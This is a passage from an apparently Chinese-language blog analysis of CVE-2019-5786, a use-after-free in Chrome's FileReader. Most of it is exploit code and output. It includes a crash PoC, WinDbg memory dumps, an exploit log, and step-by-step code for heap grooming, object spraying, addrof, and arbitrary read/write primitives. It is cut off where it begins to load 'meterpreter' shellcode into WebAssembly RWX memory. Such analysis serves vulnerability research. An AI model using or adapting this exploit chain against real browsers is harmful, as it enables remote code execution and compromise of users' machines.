class="built_in">console</span>.log(<span class="string">&#x27;verify succeed! try crash self...&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            crash();												<span class="comment">//尝试触发崩溃。</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;verify failed, retry now...&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&#x27;failed this time, retry now...&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);									<span class="comment">//如果验证失败则会重新进行尝试</span></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ab1 = ab2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> string = <span class="string">&#x27;A&#x27;</span>.repeat(byteLength);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([string]);				<span class="comment">//这里的Blob为Binary Large Object的缩写，File继承自Blob</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="javascript">    reader.onprogress = onProgress;</span></span><br><span class="line"><span class="javascript">    reader.onloadend = onLoadEnd;</span></span><br><span class="line"><span class="javascript">    reader.readAsArrayBuffer(blob);				<span class="comment">//FileReader.readAsText()可以轻易地处理一个300k的日志文件，但当日志文件有1G到2G那么大，浏览器就会崩溃。这是因为readAsText()会一下子把目标文件加载至内存，导致内存超出上限。所以如果Web应用常常需要处理大文件时，我们应该使用FileReader.readAsArrayBuffer()来一块一块读取文件。而onProgress每当读取blob时就会触发，而onloadend为当文件加载或读取完成后触发。</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">&#x27;worker.js&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        worker.postMessage(ab1, [ab1, ab2]);			<span class="comment">//核心是通过postmessage进行触发crash，postmessage定义参考[15]，其中第一个参数为aMessage，表示要发送的消息（可能是变量值也可能是结构体），第二个参数为transferList，这个参数可选，用于传递所有权。如果一个对象的所有权被转移，在发送它的上下文中将变为不可用（中止），并且只有在它被发送到的worker中可用。转移所有权这个过程中所以我们在转移ab1的所有权后再转移ab2时会抛出异常。调试时发现postMessage调用了chrome_child!WTF::ArrayBufferContents::FreeMemory函数释放掉了内存</span></span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errmsg = <span class="string">&#x27;ArrayBuffer at index 1 could not be transferred&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (e.message.indexOf(errmsg) != -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab2);</span></span><br><span class="line"><span class="javascript">            dv.setUint32(<span class="number">4</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);			<span class="comment">//此时再对该空间进行写操作即可触发UAF</span></span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">init();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc思路已经再poc注释中描述的很清晰了，核心思路就是通过onProgress和onLoadEnd得到两个可以指向相同结构体的指针，然后通过postMessage释放其中的一个指针，之后再使用了第二个指针触发漏洞。</p>
<p>运行查看可用性，发现成功触发crash</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210527092652671.png" alt="image-20210527092652671"></p>
<p>附加windbg，可以查看到相关内存现场</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(8b4.1ea4): Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">eax=00000004 ebx=008fe6a8 ecx=00000042 edx=00000042 esi=00000042 edi=13e04000</span><br><span class="line">eip=106dbd06 esp=0053eb2c ebp=0053eb54 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202</span><br><span class="line">chrome_child!Builtins_DataViewPrototypeSetUint32+0x386:</span><br><span class="line">106dbd06 881407          mov     byte ptr [edi+eax],dl      ds:002b:13e04004=??</span><br><span class="line">0:000&gt; dd edi L1</span><br><span class="line">13e04000  ????????</span><br></pre></td></tr></table></figure>

<p>此时edi指向的内存已经被释放了，当使用另一块指向同样内存的指针时将会触发访问错误。</p>
<h4 id="（4）exp分析"><a href="#（4）exp分析" class="headerlink" title="（4）exp分析"></a>（4）exp分析</h4><p>exp打印日志如下，详细代码见[13]</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hello, world!</span><br><span class="line">exploit.js:332 Array buffer allocation failed</span><br><span class="line">exploit.js:341 attempt 0 started</span><br><span class="line">exploit.js:289 onloadend attempt 1 after 76 onprogress callbacks</span><br><span class="line">exploit.js:54 found possible candidate objectat idx 4190250</span><br><span class="line">exploit.js:188 leaked absolute address of our object 5e0009c</span><br><span class="line">exploit.js:189 leaked absolute address of ta 4e04000</span><br><span class="line">exploit.js:70 found object idx in the spray array: 201 816</span><br><span class="line">exploit.js:199 addrof(reader_obj) == 98566301</span><br><span class="line">exploit.js:110 found corruptable Uint32Array-&gt;elements at 4ec1118, on Uint32Array idx 17 837</span><br><span class="line">exploit.js:246 success</span><br></pre></td></tr></table></figure>

<p>exp分析步骤参考[11]，[15]</p>
<h5 id="（1）分配128Mib字符串"><a href="#（1）分配128Mib字符串" class="headerlink" title="（1）分配128Mib字符串"></a>（1）分配128Mib字符串</h5><p>分配一个较大的字符串（128MiB），它将用作传递给<em>FileReader</em>的<em>Blob</em>的源。该分配将最终在自下而上的分配之后在自由区域中进行（从上面列出的地址空间中的<em>36690000开始</em>）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> string_size = <span class="number">128</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">let</span> contents = <span class="built_in">String</span>.prototype.repeat.call(<span class="string">&#x27;Z&#x27;</span>, string_size);</span><br><span class="line"><span class="keyword">let</span> f = <span class="keyword">new</span> File([contents], <span class="string">&quot;text.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="（2）-堆布局"><a href="#（2）-堆布局" class="headerlink" title="（2） 堆布局"></a>（2） 堆布局</h5><p>在32位win7系统中通过申请1GB的ArrayBuffer，Chrome会尝试释放512MB保留内存，而分配失败的OOM异常可以被脚本捕获使得render进程不会crash，最终导致前面申请的128MB的ArrayBuffer在这块512MB内存上分配，不受隔离堆保护，释放后可以被其他js对象占位。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> failure = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>);      </span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="（3）获取触发UAF的两个指针"><a href="#（3）获取触发UAF的两个指针" class="headerlink" title="（3）获取触发UAF的两个指针"></a>（3）获取触发UAF的两个指针</h5><p>调用<em>FileReader.readAsArrayBuffer</em>。将触发多个<em>onprogress</em>事件，如果事件的时间安排正确，则最后两个事件可以返回对同一基础ArrayBuffer的引用。可以无限重复此步骤，直到成功为止，而不会导致过程崩溃。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">reader.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    force_gc();</span><br><span class="line">    <span class="keyword">let</span> res = evt.target.result;</span><br><span class="line">    <span class="comment">// console.log(`onprogress $&#123;onprogress_cnt&#125;`);</span></span><br><span class="line">    onprogress_cnt += <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (res.byteLength != f.size) &#123;</span><br><span class="line">        <span class="comment">// console.log(`result has a different size than expected: $&#123;res.byteLength&#125;`);</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    lastlast = last;   </span><br><span class="line">    last = res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        try_cnt += <span class="number">1</span>;</span><br><span class="line">        failure = <span class="literal">false</span>; </span><br><span class="line">        <span class="keyword">if</span> (onprogress_cnt &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`less than 2 onprogress events triggered: <span class="subst">$&#123;onprogress_cnt&#125;</span>, try again`</span>);</span><br><span class="line">            failure = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (lastlast.byteLength != f.size) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`lastlast has a different size than expected: <span class="subst">$&#123;lastlast.byteLength&#125;</span>`</span>);</span><br><span class="line">            failure = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (failure === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;retrying in 1 second&#x27;</span>);</span><br><span class="line">            <span class="built_in">window</span>.setTimeout(exploit, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`onloadend attempt <span class="subst">$&#123;try_cnt&#125;</span> after <span class="subst">$&#123;onprogress_cnt&#125;</span> onprogress callbacks`</span>);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="（4）触发漏洞"><a href="#（4）触发漏洞" class="headerlink" title="（4）触发漏洞"></a>（4）触发漏洞</h5><p>直接调用postmessage可以触发漏洞，之后通过捕获到UAF的异常进入catch逻辑，执行get_rw()与rce()</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// postMessage触发catch，执行漏洞逻辑</span></span><br><span class="line">            myWorker.postMessage([last], [last, lastlast]);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.message.includes(<span class="string">&#x27;ArrayBuffer at index 1 could not be transferred&#x27;</span>)) &#123;</span><br><span class="line">                get_rw();</span><br><span class="line">                rce();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(e.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="（5）类型混淆准备，相对地址读写"><a href="#（5）类型混淆准备，相对地址读写" class="headerlink" title="（5）类型混淆准备，相对地址读写"></a>（5）类型混淆准备，相对地址读写</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向spray[outers][inners]写入特定内容</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reclaim_mixed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; outers; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j + <span class="number">2</span> &lt; inners; j+=<span class="number">3</span>) &#123;</span><br><span class="line">            spray[i][j] = &#123;<span class="attr">a</span>: marker1, <span class="attr">b</span>: marker2, <span class="attr">c</span>: tmp&#125;;</span><br><span class="line">            spray[i][j].c = spray[i][j]     <span class="comment">// 自己指向自己来得到绝对地址</span></span><br><span class="line">            spray[i][j+<span class="number">1</span>] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">8</span>);</span><br><span class="line">            spray[i][j+<span class="number">2</span>] = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">32</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实就是对spray数组循环存取下面的内存布局</p>
<blockquote>
<p>{</p>
<p>​    {</p>
<p>​        {a: marker1, b: marker2, c:  spray[i][j]};</p>
<p>​    }    </p>
<p>​    Array(8);</p>
<p>​    Uint32Array(32);</p>
<p>}</p>
</blockquote>
<p>之后可以通过tarray搜索到marker1的flag内存区域，然后根据偏移找到对象地址以及tarray的首地址</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tarray = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(lastlast);             <span class="comment">//倒数第二个onprogress返回值。</span></span><br><span class="line"><span class="comment">// find_pattern的过程</span></span><br><span class="line">object_prop_taidx = find_pattern();             <span class="comment">//通过marker1寻找偏移</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 泄漏对象的绝对地址</span></span><br><span class="line"><span class="keyword">const</span> obj_absolute_addr = tarray[object_prop_taidx + <span class="number">2</span>] - <span class="number">1</span>;  <span class="comment">//通过 spray[i][j].c 泄露对象的地址</span></span><br><span class="line">ta_absolute_addr = obj_absolute_addr - (object_prop_taidx-<span class="number">3</span>)*<span class="number">4</span>   </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`leaked absolute address of our object <span class="subst">$&#123;obj_absolute_addr.toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`leaked absolute address of ta <span class="subst">$&#123;ta_absolute_addr.toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line">reader_obj = get_obj_idx(object_prop_taidx);                        <span class="comment">//通过tarray的索引找到spray的索引</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 现在reader_obj是对Object的引用，object_prop_taidx是从ta开头的第一个内联属性的索引</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`addrof(reader_obj) == <span class="subst">$&#123;addrof(reader_obj)&#125;</span>`</span>);             <span class="comment">//这个addrof(reader_obj)-1 == obj_absolute_addr</span></span><br><span class="line">aarw_ui32 = get_corruptable_ui32a();                <span class="comment">//这个函数返回了很多东西</span></span><br></pre></td></tr></table></figure>

<p>spray[i][j]的内存现场如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; dd 9770B8C</span><br><span class="line">09770b8c  047008bd 03a0066d 03a0066d 6c626466</span><br><span class="line">09770b9c  6e828a8c 09770b8d 03a00435 00000010</span><br></pre></td></tr></table></figure>

<p>之后得到了相对地址读写的功能</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ta_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 通过原始的释放区域读取绝对地址</span></span><br><span class="line">    <span class="comment">// 最大长度为ta_absolute_addr + string_size（128MiB）</span></span><br><span class="line">    <span class="keyword">if</span> (addr &gt; ta_absolute_addr &amp;&amp; addr &lt; ta_absolute_addr + string_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> tarray[(addr-ta_absolute_addr)/<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ta_write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 通过原始的释放区域写入绝对地址</span></span><br><span class="line">    <span class="comment">// 最大长度为ta_absolute_addr + string_size（128MiB）</span></span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">4</span> || value &gt; <span class="number">2</span>**<span class="number">32</span> - <span class="number">1</span> ||</span><br><span class="line">        addr &lt; ta_absolute_addr ||</span><br><span class="line">        addr &gt; ta_absolute_addr + string_size) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`invalid args passed to ta_write(<span class="subst">$&#123;addr.toString(<span class="number">16</span>)&#125;</span>, <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    tarray[(addr-ta_absolute_addr)/<span class="number">4</span>] = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就可以通过类型混淆得到addressof的功能了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">leaked_obj</span>) </span>&#123;</span><br><span class="line">    reader_obj.a = leaked_obj;</span><br><span class="line">    <span class="keyword">return</span> tarray[object_prop_taidx];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="（6）任意地址读写"><a href="#（6）任意地址读写" class="headerlink" title="（6）任意地址读写"></a>（6）任意地址读写</h5><p>利用相对地址读写可以读写被腐烂缓冲区的backing_store，从而达到任意地址读写的目的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_corruptable_ui32a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 找到一个喷射的Uint32Array，其元素指针也落入受控区域</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; outers; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j + <span class="number">2</span> &lt; inners; j+=<span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> ui32a_addr = addrof(spray[i][j+<span class="number">2</span>]) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> bs_addr = ta_read(ui32a_addr + <span class="number">12</span>) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> elements_addr = ta_read(ui32a_addr + <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 读取其元素指针</span></span><br><span class="line">            <span class="comment">// 如果元素指针位于我们可以访问的区域内</span></span><br><span class="line">            <span class="keyword">if</span> (bs_addr &gt;= ta_absolute_addr &amp;&amp; bs_addr &lt; ta_absolute_addr + string_size &amp;&amp; </span><br><span class="line">                elements_addr &gt;= ta_absolute_addr &amp;&amp; elements_addr &lt; ta_absolute_addr + string_size) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`found corruptable Uint32Array-&gt;elements at <span class="subst">$&#123;bs_addr.toString(<span class="number">16</span>)&#125;</span>, on Uint32Array idx <span class="subst">$&#123;i&#125;</span> <span class="subst">$&#123;j&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">bs_addr</span>: bs_addr,</span><br><span class="line">                    <span class="attr">elements_addr</span>: elements_addr,</span><br><span class="line">                    <span class="attr">ui32</span>: spray[i][j+<span class="number">2</span>],</span><br><span class="line">                    <span class="attr">i</span>: i, <span class="attr">j</span>: j</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read4</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// save the old values</span></span><br><span class="line">    <span class="keyword">let</span> tmp1 = ta_read(aarw_ui32.elements_addr + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">let</span> tmp2 = ta_read(aarw_ui32.bs_addr + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rewrite the backing store ptr</span></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, addr); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> val = aarw_ui32.ui32[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, tmp1); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, tmp2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write4</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// save the old values</span></span><br><span class="line">    <span class="keyword">let</span> tmp1 = ta_read(aarw_ui32.elements_addr + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">let</span> tmp2 = ta_read(aarw_ui32.bs_addr + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rewrite the backing store ptr</span></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, addr); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, addr);</span><br><span class="line"></span><br><span class="line">    aarw_ui32.ui32[<span class="number">0</span>] = val;</span><br><span class="line"></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, tmp1); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, tmp2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行"><a href="#（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行" class="headerlink" title="（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行"></a>（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wfunc = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> meterpreter = <span class="built_in">unescape</span>(<span 